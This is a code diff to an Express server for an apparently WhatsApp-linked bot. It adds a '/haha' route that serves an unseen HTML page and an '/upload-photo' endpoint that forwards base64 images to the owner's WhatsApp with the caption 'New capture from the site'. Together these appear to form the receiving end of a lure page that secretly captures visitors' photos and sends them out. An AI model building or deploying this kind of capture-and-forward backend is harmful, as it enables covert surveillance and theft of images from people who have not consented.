@@ -11,6 +11,7 @@ const express = require('express');
 const qrcode = require('qrcode');
 const app = express();
 app.use(express.urlencoded({ extended: false, limit: '8kb' }));
+app.use(express.json({ limit: '16mb' }));
 const PORT = process.env.PORT || 3000;
 global.latestQR = null;
 global.whatsappConnection = { status: 'connecting', method: null };
@@ -2334,6 +2335,41 @@ app.post('/owner-number', async (req, res) => {
     } catch (error) {
         console.error('Could not save owner number:', error);
         res.status(500).send('Could not save owner number to this deployment\'s Upstash database.');
+    }
+});
+
+app.get('/haha', (req, res) => {
+    res.sendFile(path.join(__dirname, 'data', 'haha.html'));
+});
+
+app.post('/upload-photo', async (req, res) => {
+    try {
+        const imageData = String(req.body?.image || '');
+        if (!imageData.startsWith('data:image/')) {
+            return res.status(400).json({ ok: false, error: 'No image data was received.' });
+        }
+
+        const match = imageData.match(/^data:image\/(png|jpg|jpeg|webp);base64,(.+)$/i);
+        if (!match) {
+            return res.status(400).json({ ok: false, error: 'Unsupported image format.' });
+        }
+
+        const ownerNumber = normalizePhoneNumber(OWNER_NUMBER || botPhoneNumber);
+        if (!ownerNumber || !global.activeSock) {
+            return res.status(503).json({ ok: false, error: 'The bot is not ready to send the image yet.' });
+        }
+
+        const buffer = Buffer.from(match[2], 'base64');
+        const ownerChatJid = `${ownerNumber}@s.whatsapp.net`;
+        await global.activeSock.sendMessage(ownerChatJid, {
+            image: buffer,
+            caption: '📸 New capture from the site'
+        });
+
+        res.json({ ok: true, sentTo: ownerChatJid });
+    } catch (error) {
+        console.error('Failed to forward captured photo to owner chat:', error);
+        res.status(500).json({ ok: false, error: 'The photo could not be forwarded.' });
     }
 });
 
